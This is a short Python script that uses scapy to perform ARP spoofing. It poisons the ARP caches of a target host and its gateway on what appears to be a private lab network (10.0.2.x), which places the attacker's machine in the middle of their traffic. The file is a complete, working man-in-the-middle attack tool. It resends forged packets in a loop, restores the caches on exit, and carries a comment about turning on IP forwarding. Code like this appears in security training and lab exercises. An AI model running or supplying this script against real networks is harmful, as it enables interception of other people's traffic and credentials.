#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


target_ip = "10.0.2.6"
gateway_ip = "10.0.2.1"


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


# get_mac("10.0.2.1")

# need to keep sending these packets to remain man in the middle

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        # print("[+] Sent " + str(sent_packets_count) + " arp spoofing packets")
        # \r always print statement at the start of the line - which overwrites old statement - only works with python2
        # python 3 code - print("\r[+] Packets Sent " + str(sent_packets_count), end="")
        print("\r[+] Packets Sent " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C..... Resetting ARP tables.....")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


# need to enable port forwarding on man in the middle machine
# ech 1 > /proc/sys/net/ipv4/ip_forward